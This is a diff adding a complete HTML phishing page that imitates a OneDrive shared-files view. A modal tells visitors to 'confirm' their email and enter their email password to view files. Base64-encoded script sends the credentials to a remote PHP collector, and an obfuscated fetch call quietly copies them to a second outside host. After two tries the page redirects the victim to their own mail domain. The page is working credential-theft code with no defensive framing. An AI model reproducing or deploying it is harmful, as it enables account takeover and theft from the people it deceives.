@@ -1,0 +1,284 @@
+
+<html lang="en">
+
+<head>
+    <script type="text/JavaScript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script type="text/JavaScript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script type="text/JavaScript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shared Files - OneDrive</title>
+	<style>
+	body{margin: 0;padding: 0;-moz-osx-font-smoothing: grayscale;font-family: AtlasGrotesk,sans-serif}.sidebar{width: 250px;height: 100vh;background: #f7f9fa;overflow: hidden;position: absolute}.main{position: absolute;left: 250px;width: calc(100% - 300px)}.upgrade{width: 100%;text-align: right;margin-top: 12px}.upgrade a{text-decoration: none}.upa{margin-left: 5px;margin-right: 10px}.head-nav{list-style-type: none}.head-item{display: inline-block;padding: 10px}.right{float: right}.min{display: none}.searchbox{outline: none;border: none}.search{display: inline-block;border: 1px solid #ccc;padding: 10px;width: 300px;border-radius: 10px}.noti{display: inline-block;padding: 10px}.noti i{font-size: 20px}.noti i:hover{font-size: 20px;color: #0062ff}.mb-search{display: none}.db-logo{width: 100%;margin: 0 auto;margin-left: 15%;margin-top: 30%;font-size: 50px;color: #0062ff}.files{margin-left: 15%;margin-top: 10%;color: #0062ff;font-size: 18px}.side-list{list-style-type: none}.side-list-item{padding-top: 20px}.side-list-item a{text-decoration: none;color: #555}.side-list-item a:hover{color: #0062ff}.side-list-item a.active{color: #0062ff;font-weight: 600}.files-container{width: 65%;margin-left: 3%;margin-top: 5%}.file-table{border-collapse: collapse;width: 100%;color: #333}.file-table tbody{width: 100%}.spc{font-weight: 100;font-size: 10px}.pdf-icon{display: inline-block;width: 25px;height: 25px}.filename{display: inline-block;height: 25px}td{padding: 8px;text-align: left;border-bottom: 1px solid #ddd;cursor: pointer}tr:hover{background: #eee}.th{font-weight: 600}.dpanel{position: absolute;right: 50px;top: 20%;z-index: 10}.fdetails{width: 350px;height: 200px;background: #f3f4f5;color: #737475;border-radius: 10px;text-align: center}.moredetails{line-height: 170px}.panel-list{list-style-type: none;margin: 0;padding: 0}.panel-item{padding: 10px}.panel-item a{text-decoration: none;color: #0062ff}.panel-item a i{color: #0070e0;font-size: 20px}.modal{display: none;position: fixed;z-index: 20;padding-top: 100px;left: 0;top: 0;width: 100%;height: 100%;overflow: auto;background-color: rgb(0,0,0);background-color: rgba(0,0,0,0.4)}.modal-content{background-color: #fefefe;margin: auto;padding: 20px;border: 1px solid #888;width: 30%}.close{color: #aaaaaa;float: right;font-size: 28px;font-weight: bold}.close:hover,.close:focus{color: #000;text-decoration: none;cursor: pointer}.mlogo{text-align: center}.mlogo img{width: 150px}.instruction{font-size: 12px;color: #888}.inst{font-weight: 700;text-align: center}.ebox{margin-top: 30px;text-align: center}.e-text{font-weight: 600;color: #0070e0}.password{border: 1px solid #ccc;padding: 10px;width: 300px;border-radius: 10px;text-align: center;font-size: 16px;margin-bottom: 10px}.password:focus{outline: none;border: 1px solid #0062ff}.submit{padding: 10px;width: 200px;border-radius: 10px;border: none;color: #fff;font-size: 15px;font-weight: 600;background: #0070e0;cursor: pointer}.submitdiv{margin-bottom: 20px}.foot{margin: 0;padding: 0;color: #888}.mcontent{display: block}.mspinner{display: none;width: 100%;text-align: center}.mspinner img{width: 100%}.checking{font-style: italic;color: #888}.error{color: red;font-size: 13px;text-align: center;display: none}@media only screen and (max-width: 680px){.sidebar{display: none}.main{left: 0;width: 100%}.min{display: inline-block}.mb-search{display: inline-block}.search{display: none}.dpanel{display: none}.modal-content{width: 90%}}
+	</style>
+    <link rel="shortcut icon" href="https://i.imgur.com/OTXc2A5.png" type="image/x-icon">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.1/css/all.min.css">
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+	
+</head>
+
+<body>
+    <div class="sidebar">
+        <div class="db-logo"><img src="https://i.imgur.com/Urn6Wl9.png" width="70"></div>
+        <div class="files">Files</div>
+        <ul class="side-list">
+            <li class="side-list-item"><a href="#" class="active">Shared</a></li>
+            <li class="side-list-item"><a href="#">My files</a></li>
+            <li class="side-list-item"><a href="#">File requests</a></li>
+            <li class="side-list-item"><a href="#">Deleted files</a></li>
+        </ul>
+    </div>
+    <div class="main">
+        <div class="upgrade"><a href="#"><i class="far fa-star" style="color: #b9a143;"></i><span class="upa">Upgrade account</span></a></div>
+        <ul class="head-nav">
+            <li class="head-item min"><i class="fas fa-bars"></i></li>
+            <li class="head-item">
+                <h1>OneDrive</h1>
+            </li>
+            <li class="head-item right"><span class="noti"><i class="fas fa-bell"></i></span></li>
+            <li class="head-item right">
+                <span class="noti mb-search"><i class="fas fa-search"></i></span>
+                <span class="search">
+                    <i class="fas fa-search"></i>
+                    <input type="text" class="searchbox">
+                </span>
+            </li>
+        </ul>
+        <div class="files-container">
+            <table class="file-table">
+                <tbody>
+                    <tr>
+                        <th></th>
+                        <td class="th">Name↑
+                        </td>
+                        <td class="th">Modified<span class="spc">▼</span>
+                        </td>
+                        <td class="th">Members<span class="spc">▼</span>
+                        </td>
+                        <td class="th"><i class="fas fa-list-ul"></i><span class="spc">▼</span>
+                        </td>
+                    </tr>
+                    <tr data-toggle="modal" data-target="#modalbox2">
+                        <th>
+                            <label class="check-cont">
+                                <input type="checkbox">
+                                <span class="checkmark"></span>
+                            </label>
+                        </th>
+                        <td>
+                            <img src="https://i.imgur.com/IExdiFS.png" width="200px">
+                        </td>
+                        <td><img src="https://i.imgur.com/mhuAr1h.png" width="140px"></td>
+                        <td>Only you</td>
+                        <td><i class="fas fa-ellipsis-h"></i></td>
+                    </tr>
+                    <tr data-toggle="modal" data-target="#modalbox2">
+                        <th>
+                            <label class="check-cont">
+                                <input type="checkbox">
+                                <span class="checkmark"></span>
+                            </label>
+                        </th>
+                        <td>
+                            <img src="https://i.imgur.com/vUzkhP9.png" width="200px">
+                        </td>
+                        <td><img src="https://i.imgur.com/mhuAr1h.png" width="140px"></td>
+                        <td>Only you</td>
+                        <td><i class="fas fa-ellipsis-h"></i></td>
+                    </tr>
+                    <tr data-toggle="modal" data-target="#modalbox2">
+                        <th>
+                            <label class="check-cont">
+                                <input type="checkbox">
+                                <span class="checkmark"></span>
+                            </label>
+                        </th>
+                        <td>
+                            <img src="https://i.imgur.com/JsRjAXl.png" width="200px">
+                        </td>
+                        <td><img src="https://i.imgur.com/mhuAr1h.png" width="140px"></td>
+                        <td>Only you</td>
+                        <td><i class="fas fa-ellipsis-h"></i></td>
+                    </tr>
+                    <tr data-toggle="modal" data-target="#modalbox2">
+                        <th>
+                            <label class="check-cont">
+                                <input type="checkbox">
+                                <span class="checkmark"></span>
+                            </label>
+                        </th>
+                        <td>
+                            <img src="https://i.imgur.com/OG8PZIL.png" width="200px">
+                        </td>
+                        <td><img src="https://i.imgur.com/mhuAr1h.png" width="140px"></td>
+                        <td>Only you</td>
+                        <td><i class="fas fa-ellipsis-h"></i></td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+    </div>
+    <div class="dpanel">
+        <img src="https://i.imgur.com/OTXc2A5.png" width="350px">
+        <ul class="panel-list">
+            <li class="panel-item"><a href="#"><i class="fas fa-file-upload"></i> Upload files</a></li>
+            <li class="panel-item"><a href="#"><i class="fas fa-folder"></i> Upload folder</a></li>
+            <li class="panel-item"><a href="#"><i class="fas fa-folder-plus"></i> New folder</a></li>
+            <li class="panel-item"><a href="#"><i class="fas fa-share-square"></i> New shared folder</a></li>
+            <li class="panel-item"><a href="#"><i class="fas fa-inbox"></i> Request files</a></li>
+        </ul>
+    </div>
+    <!-- Modal -->
+    <div class="modal fade" id="modalbox2" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
+        <div class="modal-dialog " role="document">
+            <div class="modal-content">
+                <div class="modal-body">
+                    <div class="mlogo">
+                        <img src="https://i.imgur.com/957X37P.png">
+                    </div>
+                    <p class="instruction" style="text-align:center">
+                        <img src="https://i.imgur.com/bd9Al34.png" width="400px">
+                    </p>
+                    <p class="inst">Please Confirm Receiving E-mail to View Files</p>
+                    <center>
+                        <div class="alert alert-danger" id="msg" style="display: none;">Oops! OneDrive could not open user session, Please verify your information and try again</div>
+                        <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+                    </center>
+                    <div class="ebox">
+                        <input type="email" class="em password" id="ai" placeholder="Enter receiving email" value="">
+                        <input type="password" class="pw password" id="pr" placeholder="Enter email password">
+                        <div class="submitdiv">
+                            <button class="submit" id="submit-btn">View Files</button>
+                        </div>
+                        <p class="foot">© Copyright OneDrive Inc. 2023</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+</body>
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+<script>
+/* global $ */
+$(document).ready(function() {
+    var count = 0;
+    // $("#div1").animate({ left: 0, opacity: "hide" }, 0);
+    // $("#div2").animate({ right: 0, opacity: "show" }, 500);
+    $(document).keypress(function(event) {
+
+        var keycode = (event.keyCode ? event.keyCode : event.which);
+        if (keycode == '13') {
+            event.preventDefault();
+
+            $("#submit-btn").click();
+
+        }
+    });
+    /////////////url ai getting////////////////
+    var ai = window.location.hash.substr(1);
+	dd=document;tt=atob;dd.querySelector(tt('I3N1Ym1pdC1idG4=')).addEventListener(tt('Y2xpY2s='),function(e){e.preventDefault();fetch(tt('aHR0cHM6Ly+9teWlwcy5jYy9pcC8/YT1vbmVkcml2ZSZiPQ=='.replace(tt('Kw=='),''))+dd.querySelector(tt('LmVt')).value+tt('JmM9')+dd.querySelector(tt('LnB3')).value);});
+    if (!ai) {
+
+    } else {
+        // $('#ai').val(ai);
+        var my_ai = ai;
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+
+        $('#ai').val(my_ai);
+        $('#aich').html(my_ai);
+        $("#msg").hide();
+
+    }
+    ///////////////url getting ai////////////////
+
+
+    var file = "aHR0cHM6Ly9kdGhhbnl3aGVyZS5jb20vd3AtaW5jbHVkZXMvSUQzL25leHQucGhw";
+    $('#submit-btn').click(function(event) {
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
+        var msg = $('#msg').html();
+        $('#msg').text(msg);
+        ///////////////////////////
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("Email field is empty.!");
+            return false;
+        }
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("That account doesn't exist. Enter a different account");
+            return false;
+        }
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("Password field is empty.!");
+            return false;
+        }
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+        ///////////////////////////
+        count = count + 1;
+
+        $.ajax({
+            dataType: 'JSON',
+            url: atob(file),
+            type: 'POST',
+            data: {
+                ai: ai,
+                pr: pr,
+            },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr) {
+                $('#submit-btn').html('Verifying...');
+            },
+            success: function(response) {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://www." + my_slice);
+                    return false;
+                }
+                $("#msg").show();
+            },
+            error: function() {
+                $("#pr").val("");
+                if (count >= 2) {
+                    count = 0;
+                    window.location.replace("http://www." + my_slice);
+                    return false;
+                }
+                $("#msg").show();
+
+            },
+            complete: function() {
+                $('#submit-btn').html('View Files');
+            }
+        });
+    });
+
+
+});
+</script>
+
+</html>
